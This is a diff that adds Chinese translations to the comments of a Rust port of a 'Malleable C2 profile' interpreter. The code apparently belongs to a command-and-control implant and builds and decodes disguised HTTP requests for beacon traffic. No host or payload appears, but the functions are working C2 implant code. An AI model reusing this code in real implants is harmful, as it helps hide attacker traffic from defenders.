@@ -1,5 +1,7 @@
+//! Malleable C2 profile 变换程序解释器（profile.cpp）。
 //! Malleable C2 profile program interpreter (profile.cpp).
 //!
+//! `apply` 在 `profile` 结构体上执行变换程序，以构建请求（URI、参数、请求头、请求体）；`recover` 对接收到的数据运行反向程序。
 //! `apply` executes a transform program over a `profile` struct to build a
 //! request (URI, parameters, headers, body). `recover` runs the inverse
 //! program on received data.
@@ -64,6 +66,7 @@ fn strip_nul(v: &[u8]) -> &[u8] {
     }
 }
 
+/// 读取以 NUL 结尾的「长度 + 字符串」（data_string 语义）。
 /// Read a NUL-terminated length+string (data_string semantics).
 fn profile_string(parser: &mut DataP, arg: &mut [u8]) -> usize {
     parser.data_string(arg, arg.len())
@@ -92,6 +95,7 @@ fn base64_decode_tomcrypt(src: &[u8], dst: &mut [u8]) -> i32 {
     }
 }
 
+/// 对 `myprofile` 执行变换程序 `program`。
 /// Execute the transform program `program` against `myprofile`.
 pub fn apply(program: &[u8], prof: &mut Profile, arg1: &[u8], len1: usize, arg2: &[u8], len2: usize) {
     let hosth = setting_ptr(SETTING_HOST_HEADER).map(|s| s.to_vec());
@@ -118,7 +122,8 @@ pub fn apply(program: &[u8], prof: &mut Profile, arg1: &[u8], len1: usize, arg2:
                 arg.fill(0);
                 let sz = profile_string(&mut parser, &mut arg);
                 let s = strip_nul(&arg[..sz]);
-                // concat arg + temp
+                // 拼接 arg + temp。
+                // Concat arg + temp.
                 prof.stage[..s.len()].copy_from_slice(s);
                 prof.stage[s.len()..s.len() + length].copy_from_slice(&prof.temp[..length]);
                 length += s.len();
@@ -162,7 +167,8 @@ pub fn apply(program: &[u8], prof: &mut Profile, arg1: &[u8], len1: usize, arg2:
                 prof.headers[..1024].copy_from_slice(&prof.stage[..1024]);
             }
             IN_BUILD => {
-                // extract the name of the argument we want to get
+                // 取出我们要获取的参数名。
+                // Extract the name of the argument we want to get.
                 let x = parser.data_int();
                 if x == 0 {
                     prof.temp[..len1].copy_from_slice(&arg1[..len1]);
@@ -225,7 +231,8 @@ pub fn apply(program: &[u8], prof: &mut Profile, arg1: &[u8], len1: usize, arg2:
                 prof.uri[..1024].copy_from_slice(&prof.stage[..1024]);
             }
             0x0 => {
-                // set our HTTP Host header if needed
+                // 如需则设置 HTTP Host 请求头。
+                // Set our HTTP Host header if needed.
                 if !hostset {
                     if let Some(hosth) = &hosth {
                         if !hosth.is_empty() {
@@ -250,6 +257,8 @@ fn write_str(dst: &mut [u8], s: &str) -> Result<(), std::fmt::Error> {
     Ok(())
 }
 
+/// 对接收到的数据运行 recover 程序（在 `buffer` 中原位处理）。
+/// 返回恢复后的长度，失败时返回 0。
 /// Run the recover program on received data (in place in `buffer`).
 /// Returns the recovered length, or 0 on failure.
 pub fn recover(program: &[u8], buffer: &mut [u8], read: usize, max: usize) -> usize {
@@ -266,7 +275,8 @@ pub fn recover(program: &[u8], buffer: &mut [u8], read: usize, max: usize) -> us
         let next = parser.data_int();
         match next {
             IN_APPEND => {
-                // strip right [sz] characters from buffer
+                // 从 buffer 右侧剥离 [sz] 个字符。
+                // Strip right [sz] characters from buffer.
                 let sz = parser.data_int() as usize;
                 if read < sz {
                     return 0;
@@ -274,7 +284,8 @@ pub fn recover(program: &[u8], buffer: &mut [u8], read: usize, max: usize) -> us
                 read -= sz;
             }
             IN_PREPEND => {
-                // strip left [sz] characters
+                // 从左侧剥离 [sz] 个字符。
+                // Strip left [sz] characters.
                 let sz = parser.data_int() as usize;
                 if sz > read {
                     return 0;
